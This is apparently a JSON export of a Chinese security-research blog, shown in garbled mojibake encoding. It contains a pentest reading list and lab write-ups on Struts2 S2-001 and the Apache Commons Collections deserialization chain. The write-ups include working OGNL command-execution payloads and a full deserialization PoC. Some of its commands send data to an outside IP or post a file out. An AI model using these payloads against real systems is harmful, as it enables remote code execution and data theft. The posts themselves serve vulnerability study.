{"meta":{"title":"glotozz'blog","subtitle":null,"description":null,"author":"glotozz","url":"https://glotozz.github.io","root":"/"},"pages":[{"title":"å…³äºæˆ‘","date":"2019-09-04T14:16:42.000Z","updated":"2020-03-18T11:55:12.901Z","comments":true,"path":"about/index.html","permalink":"https://glotozz.github.io/about/index.html","excerpt":"","text":""},{"title":"æ–‡ç« æ”¶é›†","date":"2019-09-04T14:16:42.000Z","updated":"2020-03-20T02:46:12.298Z","comments":true,"path":"read/index.html","permalink":"https://glotozz.github.io/read/index.html","excerpt":"","text":"3/20 GitHub æœç´¢éªšæŠ€å·§ å¦‚ä½•å®šä½åŸŸç®¡ç†å‘˜ è®°ä¸€æ¬¡Redis+Getshellç»éªŒåˆ†äº« shodanè‡ªåŠ¨åŒ–åˆ©ç”¨ 3/19 ç”¨Powershellæ¡†æ¶Empireè¿›è¡Œå†…ç½‘åŸŸæ¸—é€(ä¸€) 3/18 30ä¸ªæœ‰å…³Pythonçš„å°æŠ€å·§ metasploitç»­ å†…ç½‘æ¸—é€ 3/17 Msfvenomå­¦ä¹ æ€»ç»“ Payloadå®ç°åˆ†ç¦»å…æ€ 3/16 requests.get()å‚æ•° Linux åå¼¹shellï¼ˆäºŒï¼‰åå¼¹shellçš„æœ¬è´¨ 3/15 å®æˆ˜ï¼šçˆ¬å–ç½‘æ˜“äº‘éŸ³ä¹æ­Œæ›²å¯¹åº”idå¹¶å‰”é™¤æ— ç‰ˆæƒæ­Œæ›² 3/14 [å°å¯†åœˆ]ç»å…¸å†™é…ç½®æ¼æ´ä¸å‡ ç§å˜å½¢å­¦ä¹  shellcodeåŠ è½½æ€»ç»“ åæ¸—é€ä¹‹meterpreterä½¿ç”¨æ”»ç•¥ 3/13 Linuxä¸‹çš„æƒé™ç»´æŒ 3/12 ç‰¹æ®Šæƒé™ SUIDã€SGIDã€Sticky æˆ‘æ‰€äº†è§£çš„æ¸—é€æµ‹è¯•â€”â€”Linuxåé—¨ç±»å‹ 3/11 Linuxç»ˆææ¸—é€æµ‹è¯•å‘½ä»¤æ€»ç»“ï¼ˆæ”¶è—å¤‡ç”¨ï¼‰ Linuxä¸‹å¸¸è§çš„æƒé™ç»´æŒæ–¹å¼ phpinfoä¸­å€¼å¾—æ³¨æ„çš„ä¿¡æ¯ ssiæ³¨å…¥æ¼æ´ 3/10 SSRFæ¼æ´(åŸç†&amp;ç»•è¿‡å§¿åŠ¿) ä¸€ç¯‡æ–‡ç« å¸¦ä½ æ·±å…¥ç†è§£æ¼æ´ä¹‹ XXE æ¼æ´ OSæ³¨å…¥æŒ‡åŒ— 3/5 å¸¸è§Webæºç æ³„éœ²æ€»ç»“ PHPçš„å‡ ç§è¿è¡Œæ–¹å¼ Apacheä¸­.htaccessæ–‡ä»¶åˆ©ç”¨çš„æ€»ç»“ä¸æ–°æ€è·¯æ‹“å±• 3/4 HTML5æ–°ç‰¹æ€§éƒ½æœ‰å“ªäº› .htaccessè¯¦è§£åŠ.htaccesså‚æ•°è¯´æ˜ è§£ææ¼æ´æ€»ç»“ æµ…æç™½ç›’å®¡è®¡ä¸­çš„å­—ç¬¦ç¼–ç åŠSQLæ³¨å…¥ 3/3 strtus2é‚£äº›äº‹ Struts2è‘—åRCEæ¼æ´å¼•å‘çš„åå¹´ä¹‹æ€ Xsså°æ¸¸æˆé€šå…³ç§˜ç± 3/2 æ·±å…¥äº†è§£åºåˆ—åŒ–writeObjectã€readObjectã€readResolve 3/1 Fastjsonååºåˆ—åŒ–æ¼æ´åˆ©ç”¨åˆ†æ fastjson è¿œç¨‹ååºåˆ—åŒ–pocçš„æ„é€ å’Œåˆ†æ 2/29 Javaååºåˆ—åŒ–æ¼æ´ä»å…¥é—¨åˆ°æ·±å…¥ Spring framework deserialization RCEæ¼æ´åˆ†æä»¥åŠåˆ©ç”¨ Jndiæ³¨å…¥åŠSpring RCEæ¼æ´åˆ†æ 2/28 ä»é›¶å¼€å§‹javaä»£ç å®¡è®¡ç³»åˆ—(ä¸€) Javaä»£ç å®¡è®¡å…¥é—¨ç¯‡ï¼šWebGoat 8 2/27 SVG XSSçš„ä¸€ä¸ªé»‘é­”æ³• æ·±å…¥ç†è§£æµè§ˆå™¨è§£ææœºåˆ¶å’ŒXSSå‘é‡ç¼–ç  CSPç­–ç•¥åŠç»•è¿‡æ–¹æ³• 2020å¹´ä»ç„¶æœ‰æ•ˆçš„ä¸€äº›XSS Payload 2/26 LD_PRELOAD+putenv bypass è·¨åŸŸæ–¹å¼åŠå…¶äº§ç”Ÿçš„å®‰å…¨é—®é¢˜ Python3ç¼–ç é—®é¢˜ CRLFæ³¨å…¥æ¼æ´"}],"posts":[{"title":"Javaæ¼æ´å­¦ä¹ â€”S2-001","slug":"Javaæ¼æ´å­¦ä¹ â€”S2-00","date":"2020-03-21T03:55:49.000Z","updated":"2020-03-21T08:36:11.309Z","comments":true,"path":"2020/03/21/Javaæ¼æ´å­¦ä¹ â€”S2-00/","link":"","permalink":"https://glotozz.github.io/2020/03/21/Java%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E2%80%94S2-00/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• é¢„å¤‡çŸ¥è¯† ç¯å¢ƒæ­å»º æ¼æ´å¤ç° åŸç†åˆ†æ æ¼æ´ä¿®å¤ æ€»ç»“ å‚è€ƒé“¾æ¥ï¼š ä»Šå¤©çœ‹ä¸‹Struts2ç»å…¸æ¼æ´ï¼ŒæŒæ¡ä»£ç å±‚é¢çš„åŸç†ã€‚ é¢„å¤‡çŸ¥è¯†å¹²å•¥å•¥ä¸è¡Œï¼Œç›—å›¾æˆ‘æœ€è¡Œ Servlet Filters(æ©™è‰²)ï¼šè¿‡æ»¤å™¨ï¼Œæ‰€æœ‰çš„è¯·æ±‚éƒ½è¦ç»è¿‡è¿‡æ»¤å™¨çš„å¤„ç†ã€‚ Struts Core(æµ…è“è‰²)ï¼šStruts2çš„æ ¸å¿ƒéƒ¨åˆ†ã€‚ Interceptors(æµ…ç»¿è‰²)ï¼šStruts2çš„æ‹¦æˆªå™¨ã€‚ User created(æµ…é»„è‰²)ï¼šéœ€è¦å¼€å‘äººå‘˜åˆ›å»ºçš„éƒ¨åˆ†ã€‚ å…·ä½“åŸç†å¯ä»¥å‚è€ƒé“¾æ¥æˆ–è€…strtuså®˜æ–¹æ–‡æ¡£ ç¯å¢ƒæ­å»ºå½±å“èŒƒå›´ï¼šWebWork 2.2.0-WebWork 2.2.5ï¼ŒStruts 2.0.0-Struts 2.0.8 mavenæ­å»º 123456789&lt;dependencies&gt; &lt;!-- struts2ä¾èµ–åŒ… --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.struts&lt;&#x2F;groupId&gt; &lt;artifactId&gt;struts2-core&lt;&#x2F;artifactId&gt; &lt;version&gt;2.0.8&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;&#x2F;dependencies&gt; æ³¨æ„maven/conf/settings.xmlåŠ ä¸ªé•œåƒ 123456&lt;mirror&gt; &lt;id&gt;nexus-aliyun&lt;&#x2F;id&gt; &lt;mirrorOf&gt;central&lt;&#x2F;mirrorOf&gt; &lt;name&gt;Nexus aliyun&lt;&#x2F;name&gt; &lt;url&gt;http:&#x2F;&#x2F;maven.aliyun.com&#x2F;nexus&#x2F;content&#x2F;groups&#x2F;public&lt;&#x2F;url&gt; &lt;&#x2F;mirror&gt; è¯´å‡ºæ¥ä½ å¯èƒ½ä¸ä¿¡ï¼Œæˆ‘æ­äº†åŠå¤©ã€‚ã€‚ å…ˆåˆ›å»ºä¸€ä¸ªJavaé¡¹ç›® ç„¶åAdd Framework Support å…ˆå¯¼å…¥mavenä¸‹è½½struts å†æ¬¡Add Framework Supportï¼Œè¿™æ—¶é€‰ä¸­strutsï¼ŒjaråŒ…å°±æ˜¯ä¹‹å‰mavenä¸‹å¥½çš„åŒ… æ·»åŠ Tomcatå¯åŠ¨å³å¯ï¼Œå¦‚æœå‡ºç°æŠ¥é”™ï¼ŒProject Settings-&gt;Artifactså†é…ç½®ä¸€ä¸‹ æˆåŠŸå¯åŠ¨ æºç ï¼š https://github.com/vulhub/vulhub æ¼æ´å¤ç°è·å–tomcatè·¯å¾„ 1%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125; å‘½ä»¤æ‰§è¡Œ 1%&#123;#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),#b&#x3D;#a.getInputStream(),#c&#x3D;new java.io.InputStreamReader(#b),#d&#x3D;new java.io.BufferedReader(#c),#e&#x3D;new char[50000],#d.read(#e),#f&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125; åŸç†åˆ†æåœ¨LoginActionä¸Šæ‰“ä¸ªæ–­ç‚¹ 1invokeAction:404, DefaultActionInvocation (com.opensymphony.xwork2) åœ¨DefaultActionInvocationç±»ä¸­åå°„è°ƒç”¨äº†æˆ‘ä»¬çš„ç±» æ¼æ´æ˜¯å‡ºç°åœ¨Struts2é‡æ–°æ¸²æŸ“jspæ—¶ï¼Œå¯¹ognlè¡¨è¾¾å¼è¿›è¡Œäº†é€’å½’è§£æï¼Œå¯¼è‡´äº†æ¶æ„çš„è¡¨è¾¾å¼è¢«æ‰§è¡Œã€‚ ä¸»è¦æ˜¯åœ¨xwork-2.0.3-sources.jar!/com/opensymphony/xwork2/util/TextParseUtil.java æŸ¥åˆ°è¯¥æ–¹æ³•çš„ä½œç”¨æ˜¯å°†å˜é‡è½¬æ¢ä¸ºå¯¹è±¡ é¦–å…ˆçœ‹åˆ°æœ‰ä¸ªwhile(True)ï¼Œä¹‹åå°±æ˜¯å…ˆè½¬åŒ–ä¸º%{xxx}çš„æ ¼å¼ï¼Œåˆ©ç”¨onglè§£æï¼Œ 1Object o &#x3D; stack.findValue(var, asType); æ¯”å¦‚%{username}è§£æä¸ºæˆ‘ä»¬ä¼ å…¥çš„å€¼%{1+1}ï¼Œè€Œ%{1+1}è§£æä¸º2ï¼Œ2ä¸æ»¡è¶³è§„åˆ™ï¼Œ è·³å‡ºå¾ªç¯ æ¼æ´ä¿®å¤åœ¨xwork2.0.4ä¸­ï¼Œ æ·»åŠ äº†ä¸€ä¸ªmaxLoopCountå±æ€§ï¼Œé™åˆ¶äº†é€’å½’è§£æçš„æœ€å¤§æ•°ç›®ã€‚ æ€»ç»“æ­ç¯å¢ƒ2hï¼Œè°ƒè¯•10hï¼Œåˆ†æ5minã€‚ã€‚ã€‚ è¿˜æ²¡æœ‰å¯¹onglçš„è§£æä»£ç è¿›è¡Œåˆ†æï¼Œæœ‰ç©ºå†çœ‹ å‚è€ƒé“¾æ¥ï¼š https://mengsec.com/2019/10/29/Java-Web-S2-001/ https://struts.apache.org/core-developers/big-picture https://www.dazhuanlan.com/2020/01/19/5e23f4801e064/ https://struts.apache.org/maven/struts2-core/apidocs/index.html","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"Javaååºåˆ—åŒ–æ¼æ´-Apache Commons Collections","slug":"Javaååºåˆ—åŒ–æ¼æ´-Apache Commons Collections","date":"2020-03-20T03:00:55.000Z","updated":"2020-03-20T13:49:02.298Z","comments":true,"path":"2020/03/20/Javaååºåˆ—åŒ–æ¼æ´-Apache Commons Collections/","link":"","permalink":"https://glotozz.github.io/2020/03/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-Apache%20Commons%20Collections/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• é¢„å¤‡çŸ¥è¯† ç¯å¢ƒæ­å»º æ¼æ´åˆ†æ æ€»ç»“ å‚è€ƒé“¾æ¥ï¼š é¢„å¤‡çŸ¥è¯†Javaä¸­çš„ååºåˆ—åŒ–readObject åŸç†ä¸å†èµ˜è¿°ã€‚ åœ¨é‡å†™readObject()æ–¹æ³•æ—¶ä¼šå†™ä¸€äº›æ­£å¸¸çš„æ“ä½œï¼Œç»“åˆJavaçš„åå°„æœºåˆ¶ä¾¿å¯ä»¥æ„é€ åˆ©ç”¨é“¾ã€‚ Javaçš„åå°„æœºåˆ¶ ä¸‹é¢æ‘˜è‡ªpç‰›çš„å°å¯†åœˆ åå°„æ˜¯å¤§å¤šæ•°è¯­è¨€ï§©éƒ½å¿…ï¥§å¯å°‘çš„ç»„æˆéƒ¨åˆ†ï¼Œå¯¹è±¡å¯ä»¥é€šè¿‡åå°„è·å–ä»–çš„ç±»ï¼Œç±»å¯ä»¥é€šè¿‡åå°„æ‹¿åˆ°æ‰€æœ‰æ–¹æ³•ï¼ˆåŒ…æ‹¬ç§æœ‰ï¼‰ï¼Œæ‹¿åˆ°çš„æ–¹æ³•å¯ä»¥è°ƒç”¨ï¼Œæ€»ä¹‹é€šè¿‡â€œåå°„â€ï¼Œæˆ‘ä»¬å¯ä»¥å°†Javaè¿™ç§é™æ€è¯­è¨€é™„åŠ ä¸ŠåŠ¨æ€ç‰¹æ€§ã€‚ 1234public void execute(String className, String methodName) throws Exception &#123; Class clazz = Class.forName(className); clazz.getMethod(methodName).invoke(clazz.newInstance());&#125; è·å–ç±»çš„æ–¹æ³•ï¼š forNameå®ä¾‹ï¦µåŒ–ç±»å¯¹è±¡çš„æ–¹æ³•ï¼š newInstanceè·å–å‡½æ•°çš„æ–¹æ³•ï¼š getMethodæ‰§ï¨ˆå‡½æ•°çš„æ–¹æ³•ï¼š invoke ä¸Šé¢çš„executeæ–¹æ³•å°±å¯ä»¥æ‰§è¡ŒclassNmaeç±»çš„methodNameæ–¹æ³• ç¯å¢ƒæ­å»ºå¼•å…¥commons-collections mavenæ­å»º 12345&lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt;&lt;/dependency&gt; ç‰ˆæœ¬&lt;=3.2.1å­˜åœ¨æ¼æ´ã€‚ æ¼æ´åˆ†æApache Commons Collectionsä¸­æœ‰ä¸€ä¸ªç‰¹æ®Šçš„æ¥å£ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªå®ç°è¯¥æ¥å£çš„ç±»å¯ä»¥é€šè¿‡è°ƒç”¨Javaçš„åå°„æœºåˆ¶æ¥è°ƒç”¨ä»»æ„å‡½æ•°ï¼Œå«åšInvokerTransformerã€‚ \\org\\apache\\commons\\collections\\functors\\InvokerTransformer.class å’Œæˆ‘ä¸Šé¢çš„ä¾‹å­å¾ˆåƒï¼Œä¼ å…¥çš„å‚æ•°æ˜¯inputæ˜¯ä¸€ä¸ªå®ä¾‹åŒ–å¯¹è±¡ï¼Œè°ƒç”¨çš„æ–¹æ³•iMethodNameå’Œå‚æ•°iArgséƒ½æ˜¯InvokerTransformerå®ä¾‹åŒ–æ—¶è®¾å®šçš„ã€‚æ‰€ä»¥åˆ©ç”¨è¿™ä¸ªæ–¹æ³•ä¾¿å¯ä»¥è°ƒç”¨ä»»æ„å¯¹è±¡çš„ä»»æ„æ–¹æ³•ã€‚ æƒ³åˆ°å¸¸ç”¨çš„å‘½ä»¤æ‰§è¡Œæ„é€ Runtime.getRuntime().exec(cmd) 123456Transformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"curl localhost:7999\"&#125;);invokerTransformer.transform(Runtime.getRuntime()); æˆåŠŸæ‰§è¡Œ ä½†æ˜¯æœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦é€’å½’è°ƒç”¨å¯¹è±¡ä¹Ÿæ˜¯æ”¯æŒçš„ï¼Œcommons-collectionsçš„ChainedTransformerç±»ä¸­å°è£…å¥½äº†äº†é€’å½’è°ƒç”¨è¿™ä¸ªæ–¹æ³• æµ‹è¯•ä»£ç  12345678Transformer[] transformers = new Transformer[] &#123; new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"curl localhost:7999\"&#125;) &#125;;Transformer transformerChain = new ChainedTransformer(transformers);transformerChain.transform(Runtime.getRuntime()); newä¸€ä¸ªInvokerTransformerå¯¹è±¡ï¼Œä¼ å…¥è¦æ‰§è¡Œæ–¹æ³•å’Œå‚æ•°ï¼Œæ”¾å…¥æ•°ç»„å³å¯ æ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾ååºåˆ—åŒ–çš„è§¦å‘ç‚¹ã€‚ è¿™é‡Œé¦–å…ˆç”¨åˆ°äº†ConstantTransformerï¼Œå†…ç½®çš„ä¸€ä¸ªç±»ï¼Œä¼šå°†å‚æ•°åŸæ ·è¿”å›ã€‚ å› æ­¤æ„é€  12345678Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"curl localhost:7999\"&#125;)&#125;;Transformer transformerChain = new ChainedTransformer(transformers); ä½†æ˜¯åºåˆ—åŒ–çš„æ—¶å€™æŠ¥é”™Exception in thread &quot;main&quot; java.io.NotSerializableException: java.lang.Runtime å› ä¸ºRuntimeå®ä¾‹åŒ–å¯¹è±¡æ˜¯ä¸å…è®¸åºåˆ—åŒ–çš„ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥ä¼ å…¥å®ä¾‹åŒ–çš„å¯¹è±¡ï¼ŒRuntimeæ˜¯åˆ©ç”¨getRuntimeé™æ€æ–¹æ³•å®ä¾‹åŒ–çš„ï¼Œæ‰€ä»¥å°±æ˜¯è·å–åˆ°è¿™ä¸ªæ–¹æ³•ã€‚ å¯ä»¥å‚è€ƒpç‰›ä¹‹å‰è§£å†³Runtimeä¸èƒ½newInstance()çš„ä»£ç ï¼Œè™½ç„¶å½“æ—¶è§£å†³çš„æ˜¯Runtimeç±»æ˜¯å•ä¾‹æ¨¡å¼è¿™ä¸ªç‰¹æ€§ 12345Class clazz = Class.forName(\"java.lang.Runtime\");Method getRuntimeMethod = clazz.getMethod(\"getRuntime\");Object runtime = getRuntimeMethod.invoke(clazz);Method execMethod = clazz.getMethod(\"exec\", String.class);execMethod.invoke(runtime, \"calc.exe\"); ç¬¬ä¸€æ¬¡çš„objectç”±æˆ‘ä»¬ä¼ å…¥ï¼Œä¹‹åçš„è°ƒç”¨å½¢å¼ä¸ºmethod.invoke(object,args) é‚£ä¹ˆé¦–å…ˆä¼ å…¥ä¸€ä¸ªRuntime.classï¼Œåå°„è°ƒç”¨getRuntimeï¼Œè¿”å›getRuntimeMethodï¼Œ åå°„è°ƒç”¨invokeï¼Œè¿”å›Runtimeå®ä¾‹å¯¹è±¡ï¼Œåå°„è°ƒç”¨execå‘½ä»¤æ‰§è¡Œ å‚è€ƒé“¾æ¥ä»£ç  1234567891011121314151617Transformer[] transformers = new Transformer[] &#123; //ä¼ å…¥Runtimeç±» new ConstantTransformer(Runtime.class), //åå°„è°ƒç”¨getMethodæ–¹æ³•ï¼Œç„¶ågetMethodæ–¹æ³•å†åå°„è°ƒç”¨getRuntimeæ–¹æ³•ï¼Œè¿”å›Runtime.getRuntime()æ–¹æ³• new InvokerTransformer(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;\"getRuntime\", new Class[0] &#125;), //åå°„è°ƒç”¨invokeæ–¹æ³•ï¼Œç„¶ååå°„æ‰§è¡ŒRuntime.getRuntime()æ–¹æ³•ï¼Œè¿”å›Runtimeå®ä¾‹åŒ–å¯¹è±¡ new InvokerTransformer(\"invoke\", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), //åå°„è°ƒç”¨execæ–¹æ³• new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"curl localhost:7999\"&#125;) &#125;;Transformer transformerChain = new ChainedTransformer(transformers); ä½†æ˜¯è¿˜æ˜¯éœ€è¦è°ƒç”¨ä¸€ä¸‹transform()æ–¹æ³•æ‰èƒ½è§¦å‘ æ‰¾åˆ°TiedMapEntryç±»çš„toString()æ–¹æ³•ï¼Œè°ƒç”¨getValue()æ–¹æ³• Javaä¸­çš„toStringæ–¹æ³•æ˜¯å’ŒPHPä¸­çš„__toStringé­”æœ¯æ–¹æ³•æœ‰ç›¸åŒçš„ä½œç”¨çš„ï¼Œå½“å°†è¿™ä¸ªå¯¹è±¡å½“åšå­—ç¬¦ä¸²å¤„ç†çš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ã€‚ getValueæ–¹æ³•è°ƒç”¨äº†mapå®ä¾‹çš„getæ–¹æ³• é‚£ä¹ˆå°±å¯ä»¥æ„é€ äº† 12345Transformer transformerChain = new ChainedTransformer(transformers);Map innerMap = new HashMap();Map lazyMap = LazyMap.decorate(innerMap, transformerChain);TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\"); è¿™æ ·ååºåˆ—åŒ–entryå¯¹è±¡åï¼Œè¿˜æ˜¯éœ€è¦System.out.printlnæ¥è§¦å‘toSring() æ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬æ‰¾è¿™æ ·ä¸€ä¸ªç±»ï¼šé‡å†™äº†readObjectæ–¹æ³•ï¼Œå¹¶ä¸”å¯¹æŸä¸ªå˜é‡è¿›è¡Œäº†å­—ç¬¦ä¸²æ“ä½œ çœ‹ysoserialçš„POCç›´æ¥åˆ©ç”¨äº†BadAttributeValueExpExceptionç±»ï¼Œè¿™ä¸ªç±»ç›´æ¥å°±è°ƒç”¨äº†toStringæ–¹æ³•ã€‚ å¯ä»¥æ ¹æ®ä¾èµ–æœç´¢ç›¸åº”çš„POCï¼š@Dependencies({&quot;commons-collections:commons-collections:3.1&quot;}) BadAttributeValueExpExceptionç±» æ‰€ä»¥å°†BadAttributeValueExpExceptionç±»å®ä¾‹åŒ–ï¼Œvalå˜é‡èµ‹å€¼ä¸ºTiedMapEntryçš„å®ä¾‹åŒ–å¯¹è±¡ï¼Œååºåˆ—åŒ–çš„æ—¶å€™ä¾¿ä¼šè§¦å‘å‘½ä»¤æ‰§è¡Œã€‚ æœ‰ä¸€ç‚¹å°±æ˜¯valæ˜¯ç§æœ‰å±æ€§ï¼Œæ²¡æœ‰æä¾›set()ï¼Œéœ€è¦ä½¿ç”¨åå°„æ¥èµ‹å€¼ 1234567891011121314151617package com.company;import java.lang.reflect.Field;public class Test &#123; private String readOnly; public String getReadOnly() &#123; return readOnly; &#125; public static void main(String[] args) throws SecurityException, NoSuchFieldException, IllegalArgumentException, IllegalAccessException &#123; Test t = new Test(); Field f = t.getClass().getDeclaredField(\"readOnly\"); f.setAccessible(true); f.set(t, \"test\"); System.out.println(t.getReadOnly()); &#125;&#125; æœ€ç»ˆPOC 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061package com.company;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.util.HashMap;import java.util.Map;public class Main &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InstantiationException, InvocationTargetException, IOException, NoSuchFieldException &#123; Transformer[] transformers = new Transformer[] &#123; //ä¼ å…¥Runtimeç±» new ConstantTransformer(Runtime.class), //åå°„è°ƒç”¨getMethodæ–¹æ³•ï¼Œç„¶ågetMethodæ–¹æ³•å†åå°„è°ƒç”¨getRuntimeæ–¹æ³•ï¼Œè¿”å›Runtime.getRuntime()æ–¹æ³• new InvokerTransformer(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;\"getRuntime\", new Class[0] &#125;), //åå°„è°ƒç”¨invokeæ–¹æ³•ï¼Œç„¶ååå°„æ‰§è¡ŒRuntime.getRuntime()æ–¹æ³•ï¼Œè¿”å›Runtimeå®ä¾‹åŒ–å¯¹è±¡ new InvokerTransformer(\"invoke\", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), //åå°„è°ƒç”¨execæ–¹æ³• new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"curl localhost:7999\"&#125;) &#125;; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\"); BadAttributeValueExpException poc = new BadAttributeValueExpException(null); // valæ˜¯ç§æœ‰å˜é‡ï¼Œæ‰€ä»¥åˆ©ç”¨ä¸‹é¢æ–¹æ³•è¿›è¡Œèµ‹å€¼ Field valfield = poc.getClass().getDeclaredField(\"val\"); valfield.setAccessible(true); valfield.set(poc, entry); File f = new File(\"poc.txt\"); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f)); out.writeObject(poc); out.close(); //ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–objå¯¹è±¡ FileInputStream fis = new FileInputStream(\"poc.txt\"); ObjectInputStream ois = new ObjectInputStream(fis); //æ¢å¤å¯¹è±¡ ois.readObject(); ois.close(); &#125;&#125; é€šè¿‡ä¼ å…¥å­—ç¬¦ä¸²æ•°ç»„çš„æ–¹æ³•å¸¦å‡ºæ›´å¤šæ•°æ®ï¼Œä¹Ÿå¯ä»¥åå¼¹shell 1String[] cmd = &#123;\"/bin/sh\",\"-c\",\"curl http://174.0.223.65:2333/`/readflag`\"&#125;; 12345678910111213String[] execArgs = new String[] &#123; \"sh\", \"-c\", \"ifconfig &gt; /tmp/data &amp;&amp; curl localhost:7999/ -F 'file=@/tmp/data'\" &#125;;Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;\"getRuntime\", new Class[0] &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), new InvokerTransformer(\"exec\", new Class[] &#123;String[].class &#125;, new Object[] &#123; execArgs &#125;)&#125;; æ€»ç»“æ•´æ¡é“¾ä¸é•¿ï¼Œåˆ†æä¸‹æ¥è¿˜æ˜¯æŒºæœ‰æ„æ€çš„ï¼Œè¿™ä¸ªæ¼æ´è¿˜æœ‰ä¸€äº›å…¶ä»–çš„åˆ©ç”¨æ–¹å¼ï¼Œæœ‰ç©ºç»§ç»­çœ‹ã€‚ è‡ªå·±å¯¹javaçš„ä¸€äº›è¯­è¨€ç‰¹æ€§è¿˜æ˜¯ä¸å¤Ÿäº†è§£ã€‚ é“¾æ¥é‡Œçš„å¸ˆå‚…å†™çš„å¾ˆè¯¦ç»†ï¼Œè†œ å‚è€ƒé“¾æ¥ï¼š https://p0sec.net/index.php/archives/121/ https://zsxq.tricking.io/","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"äºŒå“vulstack-1","slug":"äºŒå“vulstack-1","date":"2020-03-18T10:25:46.000Z","updated":"2020-03-20T13:31:51.821Z","comments":true,"path":"2020/03/18/äºŒå“vulstack-1/","link":"","permalink":"https://glotozz.github.io/2020/03/18/%E4%BA%8C%E5%93%81vulstack-1/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• ä¸€ã€ç¯å¢ƒæ­å»º äºŒã€ä¿¡æ¯æ”¶é›† ä¸‰ã€getshell å››ã€åŸŸæ¸—é€ msfææƒæ–¹æ³• å¼€å¯è¿œç¨‹æ¡Œé¢è¿æ¥ csä¸msfè”åŠ¨ è·å–å¯†ç æˆ–hash ä¿¡æ¯æ”¶é›† å†…ç½‘æ”¶é›† å†…ç½‘æ”»å‡»å§¿åŠ¿-MS08-067 mimikatzæ’ä»¶ å†…ç½‘æ”»å‡»å§¿åŠ¿-SMBè¿œç¨‹æ¡Œé¢å£ä»¤çŒœæµ‹ å†…ç½‘æ”»å‡»å§¿åŠ¿-Oracleæ•°æ®åº“ TNSæœåŠ¡æ¼æ´ å†…ç½‘æ”»å‡»å§¿åŠ¿-RPC DCOMæœåŠ¡æ¼æ´ å†…ç½‘æ”»å‡»å§¿åŠ¿- MS17-010 é’“é±¼æ”»å‡» å†…ç½‘å…¶ä»–ä¸»æœºç«¯å£-redis Getshell PTH åŸŸæ¸—é€-æ¨ªå‘ç§»åŠ¨[wmiåˆ©ç”¨] å†…ç½‘å…¶å®ƒä¸»æœºç«¯å£-ä»£ç†è½¬å‘ Frpå†…ç½‘ç©¿é€ CSä¸Šçº¿å†…ç½‘ä¸»æœº SSHéš§é“ æŒä¹…æ§åˆ¶ HTTP Listeneräº¤äº’ä¿¡æ¯éšè— SSP é‡‘ç¥¨åˆ©ç”¨ åé—¨æ¤å…¥ ç—•è¿¹æ¸…ç† æ€»ç»“ å‚è€ƒé“¾æ¥ï¼š 